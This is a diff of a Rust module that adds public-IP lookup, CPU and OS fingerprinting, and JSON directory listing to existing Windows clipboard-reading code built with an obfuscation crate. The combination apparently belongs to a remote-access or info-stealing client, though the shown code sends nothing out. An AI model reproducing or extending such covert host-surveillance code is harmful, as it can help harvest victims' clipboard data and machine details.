@@ -1,5 +1,6 @@
-use crate::config;
+use crate::{config, debug_println};
 
+use reqwest::Client;
 use systemstat::{Platform, System};
 use tokio::io::{
     AsyncWriteExt,
@@ -8,6 +9,7 @@ use tokio::io::{
     BufReader,
 };
 use std::error::Error;
+use std::time::UNIX_EPOCH;
 use std::{collections::BTreeMap, env, path::PathBuf};
 use tokio::fs::File;
 use goldberg::goldberg_stmts;
@@ -19,6 +21,20 @@ use windows::Win32::System::DataExchange::{OpenClipboard, GetClipboardData, Clos
 use windows::Win32::System::Memory::{GlobalLock, GlobalUnlock};
 use windows::Win32::Foundation::HGLOBAL;
 use std::ffi::CStr;
+use serde::Serialize;
+
+#[inline]
+pub async fn get_real_ip_address() -> std::result::Result<String, Box<dyn Error>> {
+    let client = Client::new();
+
+    let res = client.get(config::get_real_ip_endpoint()).send().await?;
+
+    let text = res.text().await?;
+
+    let trimmed = text.trim();
+
+    Ok(trimmed.to_string())
+}
 
 #[inline]
 pub fn read_clipboard() -> std::result::Result<String, Box<dyn Error>> {
@@ -241,6 +257,8 @@ pub struct SystemInformation {
     pub is_ac_power: String,
     pub cpu_temperature: String,
     pub cpu_info: String,
+    pub cpu_names_only: String,
+    pub os_version: String,
 }
 
 #[inline]
@@ -248,7 +266,7 @@ pub fn get_system_information() -> SystemInformation {
     let sys = System::new();
 
     let memory = match sys.memory() {
-        Ok(memory) => format!("{:?}", memory.total),
+        Ok(memory) => format!("{}", memory.total),
         Err(e) => format!("Error: {}", e),
     };
     let mut networks_error = String::new();
@@ -291,11 +309,16 @@ pub fn get_system_information() -> SystemInformation {
 
     // First we update all information of our `System` struct.
     sys.refresh_all();
+
+    let mut cpu_names_only = Vec::new();
     
     let mut cpus = String::new();
     for cpu in sys.cpus() {
         cpus += &format!("CPU: Name: {} | Brand: {} | Freq.: {}\n", cpu.name(), cpu.brand(), cpu.frequency());
+        cpu_names_only.push(cpu.brand());
     }
+
+    cpu_names_only.dedup();
 
     let information = SystemInformation{
         memory: memory,
@@ -304,7 +327,49 @@ pub fn get_system_information() -> SystemInformation {
         networks: network_names,
         cpu_temperature: cpu_temperature,
         cpu_info: cpus,
+        cpu_names_only: cpu_names_only.join(", "),
+        os_version: match sysinfo::System::os_version() {
+            Some(v) => v,
+            None => "".into(),
+        },
     };
 
     return information;
+}
+
+#[derive(Serialize)]
+pub struct FileRecord {
+    name: String,
+    timestamp: i64,
+    #[serde(rename = "isDir")]
+    is_dir: bool,
+}
+
+#[derive(Serialize)]
+pub struct DirectoryContent {
+    #[serde(rename = "currentDir")]
+    current_dir: String,
+    content: Vec<FileRecord>,
+}
+
+#[inline]
+pub fn get_directory_content(path: &Path) -> std::result::Result<DirectoryContent, std::io::Error> {
+    let current_dir = path.to_string_lossy().into_owned();
+    debug_println!("before: {}", current_dir);
+    let mut content = Vec::new();
+
+    for entry in fs::read_dir(path)? {
+        let entry = entry?;
+        let metadata = entry.metadata()?;
+        let name = entry.file_name().to_string_lossy().into_owned();
+        let is_dir = metadata.is_dir();
+        let time = metadata.created().ok().or_else(|| metadata.modified().ok());
+        let timestamp = time.and_then(|t| t.duration_since(UNIX_EPOCH).ok())
+            .map(|d| (d.as_secs() as i64 * 1_000_000_000) + d.subsec_nanos() as i64)
+            .unwrap_or(0);
+
+        content.push(FileRecord { name, timestamp, is_dir });
+    }
+
+    Ok(DirectoryContent { current_dir, content })
 }
